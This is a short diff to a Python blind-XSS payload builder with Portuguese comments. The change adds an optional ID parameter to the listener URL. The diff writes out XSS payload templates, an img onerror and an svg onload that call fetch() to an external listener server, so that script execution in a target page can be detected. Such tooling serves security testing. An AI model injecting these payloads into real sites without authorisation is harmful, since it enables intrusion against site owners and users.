@@ -302,9 +302,13 @@ def eco_verificator(driver, eco_text):
         print(f"An error occurred during verification: {e}")
         return False
 
-def build_payloads(url_ouvinte):
+def build_payloads(url_ouvinte, payload_id=None):
     """Cria uma lista de payloads blind xss com o link do servidor ouvinte."""
     payloads = []
+    
+    # Se foi fornecido um ID, adiciona como parâmetro na URL
+    url_with_id = f"{url_ouvinte}?id={payload_id}" if payload_id else url_ouvinte
+    
     payloads_models = [
         "<img src=x onerror=fetch('{url_ouvinte}')>",
         "<svg onload=fetch('{url_ouvinte}')>",
@@ -312,7 +316,7 @@ def build_payloads(url_ouvinte):
     ]
 
     for model in payloads_models:
-        payloads.append(model.format(url_ouvinte=url_ouvinte))
+        payloads.append(model.format(url_ouvinte=url_with_id))
     return payloads
 
 
